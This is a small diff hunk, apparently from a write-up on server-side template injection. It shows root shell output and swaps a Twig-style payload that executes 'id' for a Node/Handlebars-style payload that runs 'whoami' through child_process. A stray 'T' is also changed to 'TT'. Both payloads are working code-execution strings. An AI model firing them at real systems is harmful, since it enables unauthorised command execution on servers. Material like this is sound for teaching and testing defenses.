@@ -244,7 +244,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 We are root.
 
-T
+TT
 ```
-${{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+${{ this.push "return require('child_process').exec('whoami');" }}
 ```
